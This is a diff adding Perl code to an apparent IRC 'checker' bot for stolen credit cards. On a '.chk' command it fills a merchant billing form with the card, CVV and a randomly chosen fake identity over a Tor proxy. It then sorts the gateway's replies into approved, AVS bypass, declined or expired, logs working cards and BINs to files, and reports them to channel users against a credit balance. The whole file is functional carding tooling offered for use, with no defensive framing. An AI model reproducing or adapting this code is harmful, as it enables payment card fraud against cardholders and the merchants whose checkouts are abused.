+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED!!! 0- Enjoy 1- $csc 0-14 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7BANK 0:14 -- ");
+    addlog("ResChecker.txt", "$card $m$y $verifica 9APPROVED");
+    addlog("approved.txt", "$card $m$y $verifica 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/this transaction has been approved/){
+addlog("ccaproved.txt", "!cc $card $m$y $verifica AVS Bypass");
+print "\t\t\t[AVS Bypass]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 7BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 7BANK 0:14 NEED UPDATE!!! ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/ilirmorina/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 15Thank you! 0- 7BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 15Thank you! 0- 7BANK 0:14 NEED UPDATED!!! ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Invalid credit card number./){
+print "\t\t\t[CC Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid CC Number 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid Credit Card Number 0- 7BANK 0:14 NEED UPDATE!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Invalid card number/){
+print "\t\t\t[CC Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid card number [6] 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid card number [6] 0- 7BANK 0:14 NEED UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Duplicate transaction/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7Duplicate transaction [11] 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7Duplicate transaction [11] 0- 7BANK 0:14 NEED UPDATE!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/An error occurred during processing./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 An error occurred during processing [120] 0- 4[0,1MARKED LOST4] 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 An error occurred during processing [120] 0- 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/A duplicate transaction has been submitted./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 Duplicate Transaction 0- 4[0,1CARD REJECTED4] 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 Duplicate Transaction 0- 4[0,1CARD REJECTED4] 7BANK 0:14 NEED UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your credit card is expired./){
+print "\t\t\t[Expired]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 4EXPIRED CARD14,1 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 14CARD EXPIRED14,1 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction cannot be accepted at this time./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $master :SPAMMER => 4,1 BOS 8!4 MERCHANT DOWN 0-4 BOT OUT 8! ");
+    $irc_socket->write("PART @generalchans\r\n");
+    $irc_socket->write("quit\r\n");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+############################################################################################################
+    }elsif ($allo =~/The merchant does not accept this type of credit card./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7THE MERCHANT DOES NOT ACCEPT THIS TYPE OF CREDIT CARD 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7THE MERCHANT DOES NOT ACCEPT THIS TYPE OF CREDIT CARD 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/CreditCardType/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 The Merchant Does Not Accept This Type Of Credit Card 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 The Merchant Does Not Accept This Type Of Credit Card 0- 7BANK 0:10 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/&L_SHORTMESSAGE0=Processor%20Decline&L_LONGMESSAGE0=This%20transaction%20cannot%20be%20processed%2e&L_SEVERITYCODE0=Error&L_ERRORPARAMID0=ProcessorResponse&L_ERRORPARAMVALUE0=(.*)&AMT=(.*)%2e00&CURRENCYCODE=(.*)&AVSCODE=(.*)&CVV2MATCH=(.*)<br \/><br \/>/){
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7,1BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7,1BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+############################################################################################################
+    }elsif ($allo =~/IliriDotKomhh/){
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0- 7,1BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0- 7,1BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your order has been received. Thank you for your business!/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $master :SPAMMER => 4,1 BOS 8!4 MERCHANT DOWN 0-4 BOT OUT 8! ");
+    $irc_socket->write("PART @generalchans\r\n");
+    $irc_socket->write("quit\r\n");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card number is invalid./){
+print "\t\t\t[Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card or Expired 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please use a different payment card/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Rejected 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Rejected 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid credit card expiration date./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Expired 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Expired 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid credit card expiration year./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid Credit Card Verification Number./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Verification Number Invalid 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Verification Number Invalid 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    print "card $variable!";
+    }
+    }
+    }elsif ($allo =~/Please enter a valid credit card expiration year./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15CARD EXPIRED14,1 0- 7BANK 0:10 $1 ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15CARD EXPIRED14,1 0- 7BANK 0:14 IMMEDIATELY UPDATED!!! ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+    ############# NOTICE BOT OFF #############          		                 		
+    #}else{
+    #&respond_to_privmsg(\%msg,"7,1 $nick 0:14 CHECKER 0- 4OFF ");
+    #}
+    #}
+##################################################################################################################
+    ############# FORMATING #############
+    }elsif ($msg{'what'} =~ /\!chk/){
+    if($auto == 1){
+    &respond_to_privmsg(\%msg,"$nick Use : !chk ccnum mmyy cvv");  
+    }    
+    }     
+################################################################################################################################################
+#https://secure2.segpay.com/billing/poset.cgi?x-billname=&x-billemail=horusking@yahoo.com&x-eticketid=152711:13765&amount=2.99&dynamicdesc=18%20Tokens&dynamictrans=WYq2dax05vD9iEbJydlg5hn9%2fMk%3d&memberid=11291428&source=regular&layout_id=1&gaclientid=1534141285.1425508146
+
+################################# CHECKING CC ##################################################################################################
+if($msg{'what'} =~ /\.chk\s+(\b[4356][0-9]{13,16}\b)\s+(\d{4})\s+(\b[0-9]{3,4}\b)/){
+		    if($auto == 1){
+                    ############# FLOOD CONTROL #############
+                    my $wait = flood_check( 1, 8, 'CARD' );
+                    if( $wait ) {
+                    &respond_to_privmsg(\%msg,"7,1 $nick 15:3 Try Again in4 $wait Sec3 ... ");
+                    goto Akhir;
+                    } else {
+   		    }
+                    #########################################
+                    ##Coded By Payment Tor Restart & Start
+                    #$tor = service('tor restart');
+                    &respond_to_privmsg(\%msg,"3,1 $nick 0: -4 Pay Merchant 0- 9Please Wait Checking! ", $nick );
+                    ##fixed Bug !chk By Payment
+                    my ($card,$expmes,$verifica,$csc) = ($1,$2,$3,$4);
+                    my ($numerocarta,$expmes,$verifica,$amount) = ($1,$2,$3,$4,$5,);         
+                    my $var1 = substr($expmes,0,2);
+		    my $var2 = substr($expmes,2,4);
+                    my $m = substr($expmes,0,2);
+                    my $y = substr($expmes,2,4);
+                    if ($m == "01"){$m = "01";}
+                    if ($m == "02"){$m = "02";}
+                    if ($m == "03"){$m = "03";}
+                    if ($m == "04"){$m = "04";}
+                    if ($m == "05"){$m = "05";}
+                    if ($m == "06"){$m = "06";}
+                    if ($m == "07"){$m = "07";}
+                    if ($m == "08"){$m = "08";}
+                    if ($m == "09"){$m = "09";}
+		    my $range = 10;
+                    my $minimum = 1;
+                    my $curs = '$';
+                    my $random_number = int(rand($range)) + $minimum;
+		    my $urutan = 80;
+                    my $minimal = 1;
+                    my $nomor_acak = int(rand($urutan)) + $minimal;
+  		    #my $creditmax = 180;
+                    #my $creditmi =1;
+                    #my $credits = int(rand($creditmax)) + $creditmi;
+                    my $amount = 5.00;
+   		    my $tax = 5.00;
+   		    my $total = $amount+$tax;
+   		    my $cred = 190;
+   		    my $credi = 1;
+   		    my $credits = int(rand($cred)) - $credi;
+   		    my $varType = 0;
+   		    my $sleep  = time()-20;
+   		    my $name = "submit";
+   		    my $value = "submit";
+   		    my $button = "btn-confirm";
+
+    ################## RANDOM IDENTITY ##################
+    open FILE,"Random/fname.txt";
+    @array=<FILE>;
+    close FILE;
+    $firstname =$array[rand @array];
+    open FILE,"Random/lname.txt";
+    @array=<FILE>;
+    close FILE;
+    $lastname=$array[rand @array];
+    open FILE,"Random/address.txt";
+    @array=<FILE>;
+    close FILE;
+    $address=$array[rand @array];
+    open FILE,"Random/city.txt";
+    @array=<FILE>;
+    close FILE;
+    $city=$array[rand @array];
+    open FILE,"Random/states.txt";
+    @array=<FILE>;
+    close FILE;
+    $states=$array[rand @array];
+    open FILE,"Random/states_prex.txt";
+    @array=<FILE>;
+    close FILE;
+    $states_prex=$array[rand @array];
+    open FILE,"Random/zip.txt";
+    @array=<FILE>;
+    close FILE;
+    $zip=$array[rand @array];
+    open FILE,"Random/phone.txt";
+    @array=<FILE>;
+    close FILE;
+    $phone=$array[rand @array];
+    open FILE,"Random/email.txt";
+    @array=<FILE>;
+    close FILE;
+    $email=$array[rand @array];
+    open FILE,"merchant.txt";
+    @array=<FILE>;
+    close FILE;
+    $merchant=$array[rand @array];
+    open FILE,"merchantsagepay.txt";
+    @array=<FILE>;
+    close FILE;
+    $merchantsagepay=$array[rand @array];
+    ################## IGNORE ##################
+    open(FILE, "+<ignore.txt") or die "$! error";
+    my @results = <FILE>;
+    close FILE;
+    my $chknickVar = 0;
+    foreach my $url (@results){
+    if($url =~ m/(.*)\|$nick/ && $chknickVar == 0) {
+    $chknickVar = 1;
+    &respond_to_privmsg(\%msg,"3,1 $nick 0: -7 IGNORED 0- 14Your access has been denied! ", $nick );
+    goto Akhir;
+    }
+    }
+    ################## FREE CREDITS ##################
+    open(FILE, "+<freecredit.txt") or die "$! error";
+    $number = <FILE>;
+    $number = int($number);
+    $credits = $number;
+    seek(FILE, 0, 0); 
+    truncate(FILE, tell FILE);
+    print FILE $credits;
+    close(FILE);
+	
+    foreach my $line ($credits) {
+    if($line =~ /-/) {
+    goto Akhir;
+    }
+    }
+    if ( $credits == 0 ) {
+    &respond_to_privmsg(\%msg,"");
+    goto Akhir;
+    }
+    ##################### TYPE CARD #####################
+    if (substr($card,0,1)==4) {
+    $cctype = "V";
+    }
+    if (substr($card,0,1)==5) {
+    $cctype = "M";
+    }
+    if (substr($card,0,1)==6) {
+    $cctype = "D";
+    }
+    if (substr($card,0,1)==3) {
+    $cctype = "A";
+    }
+    ##################### MERCHANT BOT #####################
+print "[+] Checking $card $m$y $verifica";
+##!chk cc####################
+ my $agent = WWW::Mechanize->new( autocheck => 1,ssl_opts => {verify_hostname => 0},);
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+### By Payment Tor Proxy
+ $agent->env_proxy();
+    $agent->get(''.$merchantsagepay.'');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+     $agent->form_number(1);
+ { local $^W; $agent->current_form->value('x-billcntry', 'AO'); };
+ { local $^W; $agent->current_form->value('x-billnamefirst', ''.$firstname.''); };
+ { local $^W; $agent->current_form->value('x-billnamelast', ''.$lastname.''); };
+ { local $^W; $agent->current_form->value('x-billzip', ''.$zip.''); };
+ { local $^W; $agent->current_form->value('x-acc1', ''.$numerocarta.''); };
+ { local $^W; $agent->current_form->value('x-sec1', ''.$verifica.''); };
+ { local $^W; $agent->current_form->value('x-ccexpmonth', ''.$var1.''); };
+ { local $^W; $agent->current_form->value('x-ccexpyear', '20'.$var2.''); };
+ #{ local $^W; $agent->current_form->value('x-billemail', ''.$email.''); };
+       $agent->submit();
+       #$agent->submit();
+       
+     #{ local $^W; $agent->tick('chkClickAndPledge', 'on'); };
+       #$agent->submit('Charge my account now');
+       #$agent->submit('btn-submit imgHover');
+       #$agent->current_form()->click( class, 'btn-submit imgHover' );
+       #$agent->click_button(name => "btn-confirm");
+       #$agent->submit(#);
+       #$agent->click(value => 'Process Donation');
+       #system('echo fail');
+       #initForm(document.getElementById("frmDonate"));
